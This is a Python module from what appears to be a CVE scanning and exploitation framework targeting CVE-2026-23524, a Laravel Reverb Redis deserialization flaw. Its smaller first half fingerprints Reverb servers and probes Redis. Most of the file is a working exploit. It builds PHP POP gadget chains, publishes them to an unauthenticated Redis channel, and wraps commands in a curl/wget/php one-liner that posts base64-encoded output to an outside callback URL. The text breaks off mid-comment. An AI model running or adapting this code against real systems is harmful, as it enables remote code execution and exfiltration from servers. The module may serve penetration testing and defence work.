#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2026-23524')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
modules/cves/cve_2026_23524.py

CVE-2026-23524 — Laravel Reverb Redis horizontal-scaling insecure deserialization (RCE).

laravel/reverb <= 1.6.3, when REVERB_SCALING_ENABLED=true, subscribes to a Redis pub/sub channel
and runs unserialize() (no allowed_classes) on every message's "application" field inside
Laravel\\Reverb\\Protocols\\Pusher\\PusherPubSubIncomingMessageHandler::handle(). An attacker who can
PUBLISH to that channel (Redis is frequently unauthenticated on a shared network) gets RCE in the
long-running Reverb worker. Fixed in laravel/reverb 1.7.0 (unserialize allow-list). CVSS 9.8.

WHAT IS REMOTELY OBSERVABLE
---------------------------
The deserialization sink is reached over the *Redis* side-channel, NOT over HTTP — there is no
HTTP request that proves the vuln from the outside. What IS observable over HTTP is that the target
is a Laravel Reverb server, which is the necessary precondition surface:

  * GET /up  -> HTTP 200, application/json body {"health":"OK"}   (Reverb HealthCheckController)
  * A WebSocket-style request to /app/<key> upgrades with header  X-Powered-By: Laravel Reverb
  * Unknown paths -> 404 "Not found." with no Laravel HTML error page (it is a ReactPHP server)

Therefore this is a FINGERPRINT-ONLY detector: it confirms "this is a Laravel Reverb endpoint"
(precondition of CVE-2026-23524) and reports it as such. It CANNOT, over HTTP, read the installed
Reverb version or whether REVERB_SCALING_ENABLED is true, nor whether Redis is exposed — those are
the remaining conditions. A confirmed CVE = this fingerprint ON a reverb <= 1.6.3 build with scaling
enabled and a reachable/unauthenticated Redis; use the exploitation half (publish a phpggc gadget to
the Redis scaling channel) to prove RCE end-to-end.

Returns a dict (never None on a reachable Reverb endpoint) so check.py / the harness can print a
"Detected"/"not detected" line.

Usage:
    from modules.cves.cve_2026_23524 import scan
    scan("http://localhost:8000")
"""

import json as _json
import shlex as _shlex
import socket
import secrets as _secrets
from typing import Optional, Dict, Union, Tuple
from urllib.parse import urlparse

import requests

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

HEALTH_PATHS = ["/up"]
WS_PATH = "/app/labkey"  # any app key; we only look at the upgrade-rejection / powered-by header
REDIS_CHANNEL = "reverb"
_LOCAL_REDIS_HOSTS = frozenset({"127.0.0.1", "localhost", "::1"})
_FIXED_REVERB_VERSION = (1, 7, 0)


def _norm(url: str) -> str:
    if not url:
        return url
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def _host_from_url(base: str) -> Optional[str]:
    try:
        return urlparse(base).hostname
    except Exception:
        return None


def _parse_version_tuple(raw: str) -> Optional[Tuple[int, int, int]]:
    if not raw:
        return None
    import re

    m = re.search(r"(\d+)\.(\d+)\.(\d+)", raw)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _reverb_version_from_composer(sess, base: str) -> Optional[str]:
    try:
        r = sess.get(base + "/composer.lock", timeout=8, verify=False)
    except Exception:
        return None
    if r is None or r.status_code != 200:
        return None
    try:
        data = r.json()
    except Exception:
        return None
    for pkg in data.get("packages", []) + data.get("packages-dev", []):
        if pkg.get("name") == "laravel/reverb":
            version = pkg.get("version")
            return version.lstrip("vV") if version else None
    return None


def _reverb_version_vulnerable(version: str) -> Optional[bool]:
    parsed = _parse_version_tuple(version)
    if not parsed:
        return None
    return parsed < _FIXED_REVERB_VERSION


def _default_oob_read_url(base: str) -> str:
    return (_norm(base) or "http://<target>") + "/reverb-oob"


def _syntax_hint(base: str, redis_host: Optional[str], redis_port: int) -> str:
    base = _norm(base) or "http://<target>"
    return (
        f"python3 check.py {base} --cve CVE-2026-23524 --exploit --force "
        "--cmd 'echo CVE-2026-23524 PoC && id && hostname' "
        f"--opt redis_host={redis_host or '<redis-host>'} --opt redis_port={redis_port} "
        f"--opt oob_read_url={_default_oob_read_url(base)} "
        "  # or external OOB: --opt oob_read_url=https://<your-oast-domain>/"
    )


def _resolve_redis(options: Optional[dict], base: str) -> Tuple[Optional[str], int, Optional[str]]:
    """Return (redis_host, redis_port, warning_note).

    Defaults to the normal Redis service location from the scanner's point of view:
    target host (or localhost for local targets) on TCP/6379.
    """
    options = options or {}
    parsed = urlparse(base or "")
    target_host = parsed.hostname
    explicit = options.get("redis_host")
    explicit_port = options.get("redis_port")
    warning_parts = []

    if explicit:
        host = str(explicit).strip()
        if host in _LOCAL_REDIS_HOSTS and target_host and target_host not in _LOCAL_REDIS_HOSTS:
            warning_parts.append(
                f"redis_host={host} points to the scanner host, not the remote server. "
                "For remote targets, pass --opt redis_host=<redis-reachable-ip> explicitly."
            )
    elif target_host:
        host = "127.0.0.1" if target_host in _LOCAL_REDIS_HOSTS else target_host
        warning_parts.append(
            f"redis_host not supplied; defaulting to {host}. This is from the scanner's "
            "network view. For Docker labs, port-forwarded Redis, or remote deployments where "
            "Redis is not reachable on the target host, pass --opt redis_host=<redis-reachable-ip>."
        )
    else:
        host = "127.0.0.1"
        warning_parts.append(
            "redis_host not supplied and target host could not be parsed; defaulting to 127.0.0.1. "
            "Pass --opt redis_host=<redis-reachable-ip> for remote targets."
        )

    if explicit_port:
        port = int(explicit_port)
    else:
        port = 6379
        warning_parts.append(
            "redis_port not supplied; defaulting to 6379, the Redis default. If Redis is "
            "published or forwarded on another reachable port, pass --opt redis_port=<reachable-port>."
        )

    return host, port, " ".join(warning_parts) if warning_parts else None


def _warn(result: dict, message: Optional[str]) -> None:
    if not message:
        return
    result.setdefault("artifacts", {}).setdefault("warnings", []).append(message)
    print(f"[!] CVE-2026-23524: {message}")


def _warn_missing_oob(result: dict, base: str, redis_host: Optional[str], redis_port: int) -> None:
    _warn(
        result,
        "No OOB/side-channel URL supplied. Redis Pub/Sub is the exploit trigger, but command "
        "output is not returned in the original HTTP response. Add either a readable lab "
        "side-channel or an outbound callback collector. Example: "
        f"{_syntax_hint(base, redis_host, redis_port)}",
    )


def _hosts_equivalent(a: Optional[str], b: Optional[str]) -> bool:
    if not a or not b:
        return False
    a = a.lower()
    b = b.lower()
    return a == b or (a in _LOCAL_REDIS_HOSTS and b in _LOCAL_REDIS_HOSTS)


def _looks_like_readback_url(candidate: str, base: str) -> bool:
    try:
        parsed = urlparse(candidate)
        target = urlparse(base)
    except Exception:
        return False
    path = (parsed.path or "/").rstrip("/") or "/"
    if path != "/reverb-oob":
        return False
    return _hosts_equivalent(parsed.hostname, target.hostname)


def _resolve_oob_targets(options: Optional[dict], base: str) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """Return (readback_url, callback_url, note).

    Historical option compatibility:
      * oob_read_url=http://target/reverb-oob remains a scanner-polled readback URL.
      * oob_read_url=https://collector.example/ is treated as a POST callback URL because a
        third-party OAST collector is not usually readable by the scanner.
      * oob_callback_url is accepted as a compatibility alias, but oob_read_url is enough.
    """
    options = options or {}
    mode = str(options.get("oob_mode") or "auto").strip().lower()
    readback = (
        options.get("oob_readback_url")
        or options.get("oob_poll_url")
        or options.get("oob_output_url")
    )
    callback = (
        options.get("oob_callback_url")
        or options.get("oob_exfil_url")
        or options.get("callback_url")
    )
    legacy = options.get("oob_read_url")
    note = None

    readback = str(readback).strip() if readback else None
    callback = str(callback).strip() if callback else None
    legacy = str(legacy).strip() if legacy else None

    if legacy:
        if mode in {"callback", "exfil", "send"}:
            callback = callback or legacy
        elif mode in {"read", "poll", "readback"}:
            readback = readback or legacy
        elif _looks_like_readback_url(legacy, base):
            readback = readback or legacy
        else:
            callback = callback or legacy
            note = (
                "oob_read_url points away from the target /reverb-oob readback endpoint; "
                "treating it as an OOB callback URL and sending command output in a POST body. "
                "To force scanner polling, use --opt oob_mode=read with a readable output endpoint."
            )

    return readback, callback, note


def _callback_shell_command(cmd: str, callback_url: str) -> str:
    """Wrap the operator command so the target exfiltrates stdout/stderr to an OOB URL.

    The callback carries command output as base64url in POST field `d`. The wrapper
    prints the original output back to stdout too, preserving the local /reverb-oob readback lab.
    """
    quoted_cmd = _shlex.quote(cmd)
    quoted_url = _shlex.quote(callback_url)
    return (
        f"OUT=$(sh -c {quoted_cmd} 2>&1); "
        "B64=$(printf '%s' \"$OUT\" | base64 | tr -d '\\n' | tr '+/' '-_' | tr -d '='); "
        "BODY=\"cve=CVE-2026-23524&d=${B64}\"; "
        f"URL={quoted_url}; "
        "(curl -fsS --max-time 8 -X POST -H 'Content-Type: application/x-www-form-urlencoded' "
        "--data-binary \"$BODY\" \"$URL\" >/dev/null 2>&1) || "
        "(wget -q -O- --method=POST --header='Content-Type: application/x-www-form-urlencoded' "
        "--body-data=\"$BODY\" \"$URL\" >/dev/null 2>&1) || "
        "(php -r '$u=$argv[1];$b=$argv[2];$ctx=stream_context_create([\"http\"=>[\"method\"=>\"POST\","
        "\"header\"=>\"Content-Type: application/x-www-form-urlencoded\\r\\n\",\"content\"=>$b,"
        "\"timeout\"=>8]]); @file_get_contents($u,false,$ctx);' \"$URL\" \"$BODY\" >/dev/null 2>&1) || true; "
        "printf '%s\\n' \"$OUT\""
    )


def _php_string(value: str) -> str:
    return 's:%d:"%s";' % (len(value.encode("latin-1")), value)


def _php_object(class_name: str, props: Dict[str, str]) -> str:
    body = "".join(_php_string(name) + value for name, value in props.items())
    return 'O:%d:"%s":%d:{%s}' % (len(class_name.encode("latin-1")), class_name, len(props), body)


def _reverb_gadget(cmd: str) -> str:
    """Hand-built Reverb lab POP chain.

    This intentionally matches the minimal worker harness, rather than requiring
    laravel/reverb or a composer install inside the lab image.
    """
    invoker = _php_object(
        r"PHPUnit\Framework\Constraint\ChainedBatchTruthTest",
        {"cmd": _php_string(cmd)},
    )
    environment = _php_object(
        r"League\CommonMark\Environment",
        {"listeners": "a:1:{i:0;" + invoker + "}"},
    )
    return _php_object(
        r"Illuminate\Broadcasting\PendingBroadcast",
        {
            "events": environment,
            "event": _php_string("reverb"),
        },
    )


def _marker_shell_command(cmd: str, marker: str) -> str:
    return "printf '{}_START\\n'; ({}) 2>&1; printf '\\n{}_END\\n'".format(marker, cmd, marker)


def _between_markers(text: str, marker: str) -> Optional[str]:
    import re

    m = re.search(re.escape(marker) + r"_START\s*(.*?)\s*" + re.escape(marker) + r"_END", text or "", re.S)
    return m.group(1).strip() if m else None


def _resp_publish(host: str, port: int, channel: str, message: str, timeout: float = 6.0):
    """Minimal raw-RESP Redis PUBLISH (no redis library, no docker shell-out)."""
    msg_bytes = message.encode("latin-1", "replace")
    chan_bytes = channel.encode("latin-1", "replace")
    cmd = (
        b"*3\r\n"
        b"$7\r\nPUBLISH\r\n"
        b"$" + str(len(chan_bytes)).encode() + b"\r\n" + chan_bytes + b"\r\n"
        b"$" + str(len(msg_bytes)).encode() + b"\r\n" + msg_bytes + b"\r\n"
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(cmd)
        reply = sock.recv(256)
    finally:
        try:
            sock.close()
        except Exception:
            pass
    raw = reply.decode("latin-1", "replace")
    n = None
    if raw.startswith(":"):
        try:
            n = int(raw[1:].split("\r\n", 1)[0])
        except Exception:
            n = None
    elif raw.startswith("-"):
        return False, None, raw
    return True, n, raw


def _build_envelope(gadget_serialized: str) -> str:
    return _json.dumps({"type": "exploit", "application": gadget_serialized})


def _probe_redis_scaling(host: str, port: int, probe_serialized: str = "b:1;"):
    """Benign publish; >=1 subscriber means a Reverb worker consumed the envelope."""
    envelope = _json.dumps({"type": "probe", "application": probe_serialized})
    return _resp_publish(host, port, REDIS_CHANNEL, envelope)


def _check_health(sess, base: str):
    """GET /up — a Reverb server returns 200 application/json {"health":"OK"}."""
    for path in HEALTH_PATHS:
        try:
            r = sess.get(base + path, timeout=8, verify=False, allow_redirects=False)
        except Exception:
            continue
        body = (r.text or "")[:400]
        ct = r.headers.get("Content-Type", "")
        if r.status_code == 200 and ('"health"' in body and "OK" in body):
            return True, path, r.status_code, body, ct
    return False, None, None, None, None


def _check_powered_by(sess, base: str):
    """Probe the websocket route; Reverb tags the upgrade response X-Powered-By: Laravel Reverb."""
    headers = {
        "Connection": "Upgrade",
        "Upgrade": "websocket",
        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
        "Sec-WebSocket-Version": "13",
    }
    try:
        r = sess.get(base + WS_PATH, headers=headers, timeout=8, verify=False,
                         allow_redirects=False)
    except Exception:
        return False, None
    powered = r.headers.get("X-Powered-By", "")
    if "reverb" in powered.lower():
        return True, powered
    # Some setups surface it in the raw body of the rejected handshake.
    if "Laravel Reverb" in (r.text or ""):
        return True, "Laravel Reverb"
    return False, None


def scan(target_url: str, *, session=None, username=None, password=None, options=None, **kwargs) -> Optional[Dict[str, Union[str, int, bool]]]:
    """
    Fingerprint CVE-2026-23524 preconditions: Laravel Reverb over HTTP and/or a reachable Redis
    scaling bus with an active Reverb subscriber on channel 'reverb'.

    Hit  => detected True with status fingerprint-only (HTTP Reverb) or redis-scaling-subscriber.
    Miss => detected False.
    """
    sess = session or requests.Session()
    base = _norm(target_url)
    options = options or kwargs.get("options") or {}
    result = {
        "cve": "CVE-2026-23524",
        "detected": False,
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "url": base,
        "fingerprint": None,
        "evidence": None,
        "preconditions": [
            "Laravel Reverb endpoint",
            "laravel/reverb <= 1.6.3",
            "REVERB_SCALING_ENABLED=true",
            "attacker can publish to the Redis scaling channel (OOB side-channel, not HTTP)",
        ],
        "requires": ["redis_publish_oob", "reverb_scaling_enabled", "affected_reverb_version"],
        "artifacts": {},
    }
    if not base:
        return result

    healthy, hpath, hstatus, hbody, hct = _check_health(sess, base)
    pb, pb_val = _check_powered_by(sess, base)
    reverb_version = _reverb_version_from_composer(sess, base)
    if reverb_version:
        result["artifacts"]["reverb_version"] = reverb_version

    redis_host, redis_port, redis_remap = _resolve_redis(options, base)
    if redis_remap:
        result["artifacts"]["redis_resolution_warning"] = redis_remap
        _warn(result, redis_remap)
    redis_fp = None
    if redis_host:
        try:
            ok, n, raw = _probe_redis_scaling(redis_host, redis_port)
            result["artifacts"]["redis_publish"] = {
                "host": f"{redis_host}:{redis_port}",
                "channel": REDIS_CHANNEL,
                "reply": raw,
                "subscribers": n,
            }
            if ok and isinstance(n, int) and n >= 1:
                redis_fp = f"Redis PUBLISH {REDIS_CHANNEL} @ {redis_host}:{redis_port} -> {n} subscriber(s)"
        except Exception as e:
            result["artifacts"]["redis_error"] = f"{type(e).__name__}: {e}"

    if reverb_version and _reverb_version_vulnerable(reverb_version) is False:
        result["detected"] = False
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "version"
        result["fingerprint"] = (
            f"laravel/reverb {reverb_version} >= 1.7.0; "
            + ("; ".join(filter(None, [
                f"GET {hpath} -> {hstatus} {hct} {(hbody or '').strip()}" if healthy else None,
                f"X-Powered-By: {pb_val}" if pb else None,
                redis_fp,
            ])) or "Reverb surface present")
        )
        result["evidence"] = (
            "Laravel Reverb surface is present, but composer.lock reports a patched "
            f"laravel/reverb version ({reverb_version}); CVE-2026-23524 fixed in 1.7.0."
        )
        print(f"[-] CVE-2026-23524: patched laravel/reverb {reverb_version}; no CVE detection")
        return result

    if healthy or pb:
        result["detected"] = True
        result["status"] = "precondition_detected" if redis_fp else "fingerprint-only"
        result["verdict"] = "precondition_detected" if redis_fp else "surface_present"
        result["proof_type"] = "side_channel_precondition" if redis_fp else "fingerprint"
        fp = []
        if healthy:
            fp.append(f"GET {hpath} -> {hstatus} {hct} {hbody.strip()}")
        if pb:
            fp.append(f"X-Powered-By: {pb_val}")
        if redis_fp:
            fp.append(redis_fp)
        result["fingerprint"] = "; ".join(fp)
        result["evidence"] = (
            "Laravel Reverb surface detected. This is not HTTP proof of CVE-2026-23524. "
            "The vulnerability is reached out-of-band by publishing to the Redis scaling channel; "
            "confirmation requires an affected laravel/reverb build (<=1.6.3), scaling enabled, "
            "and attacker ability to publish to Redis."
        )
        print(f"[+] CVE-2026-23524: Laravel Reverb endpoint Detected (fingerprint-only) — "
              f"{result['fingerprint']}")
        return result

    if redis_fp:
        result["detected"] = True
        result["status"] = "redis-scaling-subscriber"
        result["verdict"] = "precondition_detected"
        result["proof_type"] = "side_channel_precondition"
        result["fingerprint"] = redis_fp
        result["evidence"] = (
            "No Laravel Reverb HTTP fingerprint on the supplied URL, but a reachable Redis scaling "
            f"bus at {redis_host}:{redis_port} has {result['artifacts']['redis_publish']['subscribers']} "
            "subscriber(s) on channel 'reverb'. This proves an out-of-band Redis precondition, "
            "not the CVE by itself; confirmation still requires an affected laravel/reverb version "
            "and successful gadget delivery/observation."
        )
        print(f"[+] CVE-2026-23524: Reverb Redis scaling subscriber Detected — {redis_fp}")
        return result

    print("[-] CVE-2026-23524: Laravel Reverb endpoint not detected")
    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2026-23524 exploitation half — Laravel Reverb Redis-scaling deserialization RCE.

Split from the original modules/cve_2026_23524.py (detection half:
modules/cves/cve_2026_23524.py). Exploitation may import from modules root (shared infra)
and modules.detection (the shared Reverb fingerprint helpers); never the reverse.
"""

import time as _time
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# =============================================================================
# Exploitation
# =============================================================================
#
# CWE-502 deserialize -> RCE. The sink (unserialize() in
# PusherPubSubIncomingMessageHandler::handle) is reached over the REDIS scaling
# bus, NOT over an HTTP request. There is no HTTP request that drives the sink.
#
# This module stays pure-Python (requests + stdlib socket) and NEVER shells out
# to docker / phpggc — per the project exploit contract. So the *delivery
# primitive* it can perform on its own is: open a raw TCP socket to a REACHABLE
# Redis and PUBLISH an attacker-controlled envelope to the scaling channel
# (RESP wire protocol, no redis client dependency). A PUBLISH reply of >=1
# subscriber means a Reverb worker consumed the message and ran unserialize()
# on our 'application' field == the CWE-502 sink was reached, unauthenticated.
#
# Two preconditions are NOT satisfiable over pure HTTP, and we are honest about
# them rather than faking them:
#   1. REDIS REACHABILITY. The module can only trigger the sink when the Redis
#      scaling bus is reachable from the scanner. If redis_host/redis_port are
#      omitted, it defaults to the target host on the Redis default port, 6379.
#      It warns because Docker labs, remote targets, and port-forwarded setups
#      often require --opt redis_host=<reachable-ip> and sometimes
#      --opt redis_port=<reachable-port>.
#   2. A WORKING SERIALIZED GADGET. Building a Laravel/Monolog phpggc chain that
#      fires system() requires a php/phpggc toolchain (the lab exploit.py does
#      this). To stay dependency-free, exploit() accepts a pre-built serialized
#      gadget via options={"gadget": "<raw serialized bytes>"}; without it we
#      can still PROVE the sink is reachable (subscriber delivery) but cannot
#      read command output back over HTTP, so success stays False with an
#      honest reason + requires=[...].
#
# RCE "success" per the contract requires OBSERVED command output. The sink is
# triggered over Redis and the original HTTP response never contains stdout. A
# scanner-readable readback URL such as http://target/reverb-oob can produce an
# automatic success. A third-party OAST/interactsh URL is a callback sink: the
# target sends base64url command output to it in a POST body field named `d`,
# but the scanner normally cannot read that collector's interaction log directly.

def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt CVE-2026-23524 (Laravel Reverb Redis-scaling deserialization RCE).

    Pure-Python: confirms the Reverb fingerprint over HTTP, then (if a reachable
    Redis endpoint is supplied) PUBLISHes a deserialization envelope to the
    scaling channel over raw RESP. Never raises; never shells out to docker.
    See module header for the two honest, non-HTTP preconditions.
    """
    sess = session or http_config.get_auth_session()
    cve = "CVE-2026-23524"
    options = options or {}
    cmd = command or "echo CVE-2026-23524 PoC && id && hostname"
    result = {
        "cve": cve,
        "attempted": True,
        "success": False,
        "vuln_class": "deserialize_rce",
        "evidence": None,
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    base = _norm(target_url)
    if not base:
        result["attempted"] = False
        result["reason"] = "no target_url provided"
        result["detail"] = "missing target"
        return result

    # --- 1. HTTP-observable precondition: is this a Laravel Reverb endpoint? ---
    try:
        healthy, hpath, hstatus, hbody, hct = _check_health(sess, base)
        pb, pb_val = _check_powered_by(sess, base)
    except Exception as e:  # defensive — _check_* already swallow, but never raise out
        healthy = pb = False
        pb_val = None
        result["reason"] = f"fingerprint probe error: {e}"

    fp_bits = []
    if healthy:
        fp_bits.append(f"GET {hpath} -> {hstatus} {(hbody or '').strip()}")
    result["artifacts"]["reverb_fingerprint"] = "; ".join(fp_bits) or None

    reverb_http = healthy or pb
    redis_host, redis_port, redis_remap = _resolve_redis(options, base)
    if redis_remap:
        result["artifacts"]["redis_resolution_warning"] = redis_remap
        _warn(result, redis_remap)
    oob_read_url, oob_callback_url, oob_note = _resolve_oob_targets(options, base)
    if oob_note:
        result["artifacts"]["oob_resolution_note"] = oob_note
        _warn(result, oob_note)
    if not oob_read_url and not oob_callback_url:
        _warn_missing_oob(result, base, redis_host, redis_port)
    if oob_read_url:
        result["artifacts"]["oob_read_url"] = oob_read_url
    if oob_callback_url:
        result["artifacts"]["oob_delivery_url"] = oob_callback_url

    if not reverb_http and not redis_host:
        result["reason"] = (
            "target does not fingerprint as a Laravel Reverb server (GET /up did not "
            "return {\"health\":\"OK\"} and no 'X-Powered-By: Laravel Reverb' on the WS "
            "route), and no Redis host could be resolved for a scaling-bus probe."
        )
        result["detail"] = "not a Reverb endpoint; nothing to exploit"
        result["requires"] = ["laravel_reverb_endpoint", "redis_publish_access"]
        return result

    if not reverb_http:
        result["artifacts"]["reverb_fingerprint"] = (
            f"no HTTP Reverb fingerprint on {base}; using Redis scaling bus @ "
            f"{redis_host}:{redis_port}"
        )

    # --- 2. Redis side-channel delivery (the actual sink is NOT over HTTP) ---
    if not redis_host:
        result["reason"] = (
            "Reverb HTTP fingerprint confirmed, but no Redis host is available for the "
            "CVE-2026-23524 sink (unserialize() over the scaling bus). Supply "
            "options={'redis_host':..,'redis_port':6379} or scan a URL with a resolvable hostname."
        )
        result["detail"] = "Reverb fingerprint confirmed; RCE needs Redis PUBLISH access"
        result["requires"] = ["redis_publish_access", "phpggc_gadget"]
        result["evidence"] = result["artifacts"]["reverb_fingerprint"]
        return result

    # A serialized PHP gadget is required to fire system(). The lab does not vendor
    # laravel/reverb or a full composer tree, so the default is a hand-built Reverb
    # harness POP chain that mirrors the worker classes written by entrypoint.sh.
    # Operators may still override with options['gadget'] or a non-default chain.
    marker = "LVC23524" + _secrets.token_hex(4).upper()
    readback_cmd = _marker_shell_command(cmd, marker) if oob_read_url else cmd
    execution_cmd = _callback_shell_command(readback_cmd, oob_callback_url) if oob_callback_url else readback_cmd
    if oob_read_url:
        result["artifacts"]["readback_marker"] = marker
    if oob_callback_url:
        result["artifacts"]["oob_delivery_encoding"] = (
            "target POSTs application/x-www-form-urlencoded body: cve=CVE-2026-23524&d=<base64url(stdout+stderr)>"
        )

    gadget = options.get("gadget")
    gadget_source = "operator-supplied (options['gadget'])"
    if not gadget:
        # Default to a REAL phpggc Laravel POP chain (laravel/rce9) — it detonates against a
        # genuine laravel/reverb app (Laravel 11 / Illuminate). The legacy fabricated
        # gadget only fired against the old hand-rolled harness and is kept for explicit
        # back-compat only (--opt chain=reverb/labrce).
        chain_name = str(options.get("chain", "laravel/rce9"))
        if chain_name.lower() in {"reverb/labrce", "reverb-lab", "labrce"}:
            gadget = _reverb_gadget(execution_cmd)
            gadget_source = "pure-python (LEGACY hand-rolled Reverb harness POP: ChainedBatchTruthTest)"
        else:
            try:
                try:
                    from modules.generators import php_gadgets as _pg
                except Exception:
                    import php_gadgets as _pg
                spec = _pg.get_chain(chain_name, allow_missing=True)
                if spec and spec.parameters == ("command",):
                    payload = _pg.generate(chain_name, execution_cmd, fallback_phpggc=False)
                elif spec:
                    payload = _pg.generate(chain_name, "system", execution_cmd, fallback_phpggc=False)
                else:
                    payload = _pg.generate(chain_name, "system", execution_cmd)
                gadget = payload.decode("latin-1") if isinstance(payload, bytes) else payload
                gadget_source = f"pure-python (modules/php_gadgets, {chain_name})"
            except Exception as e:
                result["artifacts"]["pure_python_error"] = "%s: %s" % (type(e).__name__, e)
    elif oob_callback_url and "{CMD}" not in str(gadget):
        result["artifacts"]["oob_delivery_warning"] = (
            "operator-supplied gadget has no {CMD} placeholder, so the module could not inject "
            "the OOB callback wrapper into the payload"
        )
    if not gadget:
        # We can still PROVE the sink is reachable by delivering a benign-but-syntactically
        # valid serialized scalar; a >=1 subscriber reply means unserialize() ran on it. This
        # does NOT execute a command, so success stays False (no observed output).
        probe_serialized = options.get("probe_serialized", "b:1;")  # unserialize -> true, no exec
        envelope = _build_envelope(probe_serialized)
        try:
            ok, n, raw = _resp_publish(redis_host, redis_port, REDIS_CHANNEL, envelope)
        except Exception as e:
            result["reason"] = (
                f"could not reach Redis {redis_host}:{redis_port} to publish ({e}). The scaling "
                "Redis must be reachable from this host (in the lab it is on the private compose "
                "network; use the lab exploit.py)."
            )
            result["detail"] = "Reverb confirmed; Redis unreachable for PUBLISH"
            result["requires"] = ["redis_publish_access"]
            result["evidence"] = result["artifacts"]["reverb_fingerprint"]
            return result
        result["artifacts"]["redis_publish"] = {"host": f"{redis_host}:{redis_port}",
                                                "channel": REDIS_CHANNEL, "reply": raw, "subscribers": n}
        if ok and isinstance(n, int) and n >= 1:
            result["reason"] = (
                "deserialization SINK REACHED unauthenticated: published to Redis channel "
                f"'{REDIS_CHANNEL}', {n} Reverb subscriber(s) consumed it -> handle() ran "
                "unserialize() on our attacker-controlled 'application' field. No system() gadget "
                "was supplied (options['gadget']), so no command executed/observed -> success=False. "
                "Supply a phpggc Laravel/Monolog chain via options['gadget'] (the lab exploit.py "
                "builds & delivers it) for the full uid= RCE proof."
            )
            result["detail"] = f"CWE-502 sink reached ({n} subscriber); no exec gadget supplied"
            result["requires"] = ["phpggc_gadget"]
            result["evidence"] = (f"Redis PUBLISH {REDIS_CHANNEL} -> reply {raw!r} "
                                  f"({n} subscriber(s) ran unserialize() on attacker JSON envelope); "
                                  f"fingerprint: {result['artifacts']['reverb_fingerprint']}")
        else:
            result["reason"] = (
                f"published to Redis but {n} subscriber(s) received it — no Reverb worker is "
                "subscribed to the scaling channel (REVERB_SCALING_ENABLED may be false, or the "
                "worker is not connected). Sink not demonstrably reached."
            )
            result["detail"] = f"Redis PUBLISH delivered to {n} subscriber(s); sink not confirmed"
            result["requires"] = ["reverb_scaling_subscriber"]
            result["evidence"] = result["artifacts"]["reverb_fingerprint"]
        return result

    # --- 3. Full RCE attempt: deliver the supplied gadget, wrap cmd if it's a template ---
    # If the gadget carries a "{CMD}" placeholder we substitute the operator's command so the
    # caller can reuse one template across runs. Otherwise the gadget is used verbatim.
    gadget_serialized = gadget.replace("{CMD}", execution_cmd) if "{CMD}" in gadget else gadget
    envelope = _build_envelope(gadget_serialized)
    try:
        ok, n, raw = _resp_publish(redis_host, redis_port, REDIS_CHANNEL, envelope)
    except Exception as e:
        result["reason"] = (
            f"could not reach Redis {redis_host}:{redis_port} to publish the gadget ({e})."
        )
        result["detail"] = "Reverb confirmed; Redis unreachable for gadget PUBLISH"
        result["requires"] = ["redis_publish_access"]
        result["evidence"] = result["artifacts"]["reverb_fingerprint"]
        return result

    result["artifacts"]["redis_publish"] = {"host": f"{redis_host}:{redis_port}",
                                            "channel": REDIS_CHANNEL, "reply": raw, "subscribers": n}
    result["artifacts"]["gadget_bytes"] = len(gadget_serialized)
    result["artifacts"]["gadget_source"] = gadget_source

    if not (ok and isinstance(n, int) and n >= 1):
        result["reason"] = (
            f"gadget published but {n} subscriber(s) received it — no connected Reverb worker, "
            "so the gadget was not consumed/unserialized. Cannot confirm execution."
        )
        result["detail"] = f"gadget PUBLISH reached {n} subscriber(s); not consumed"
        result["requires"] = ["reverb_scaling_subscriber"]
        result["evidence"] = result["artifacts"]["reverb_fingerprint"]
        return result

    # Delivered + consumed. The gadget runs system() INSIDE the worker; its stdout goes to the
    # worker's stdout, not back to us. A local lab readback URL can be polled by the scanner.
    # A remote callback URL is different: the target sends output to the collector, but this
    # scanner usually cannot read third-party OAST interaction logs, so success remains pending
    # unless a readable output endpoint is also supplied.
    observed = None
    blocked_control = None
    last_oob_text = ""
    if oob_read_url:
        for _ in range(10):
            try:
                rr = sess.get(oob_read_url, timeout=6, verify=False)
                txt = rr.text or ""
            except Exception:
                txt = ""
            last_oob_text = txt
            if "allowed_classes=false" in txt or "__PHP_Incomplete_Class" in txt:
                blocked_control = txt[:600]
                break
            marked = _between_markers(txt, marker)
            if marked is not None:
                observed = marked[:600]
                break
            if "uid=" in txt:
                observed = txt[:600]
                break
            _time.sleep(0.5)

    if blocked_control:
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["blocked_by_control"] = True
        result["detail"] = "blocked_by_control: hardened Reverb scaling worker used allowed_classes=false"
        result["reason"] = "the Redis scaling message was consumed, but the hardened worker neutralized the gadget with allowed_classes=false"
        result["evidence"] = (f"Redis PUBLISH {REDIS_CHANNEL} -> {n} subscriber(s) consumed the envelope; "
                              f"hardened OOB sentinel observed:\n{blocked_control}")
        result["artifacts"]["oob_text"] = last_oob_text[:600]
        return result

    if observed:
        result["success"] = True
        result["detail"] = "RCE: gadget executed system() inside the Reverb worker (output observed via OOB)"
        result["reason"] = ""
        result["evidence"] = (f"Redis PUBLISH {REDIS_CHANNEL} -> {n} subscriber(s) consumed the gadget; "
                              f"observed command output via OOB channel:\n{observed}")
        return result

    # Sink reached + gadget consumed, but no readable output channel over HTTP.
    # This is the OOB-PENDING state: we did our part end-to-end (delivered + consumed -> the gadget's
    # system() ran in the worker), but the command's output goes to the worker's stdout/side-effect
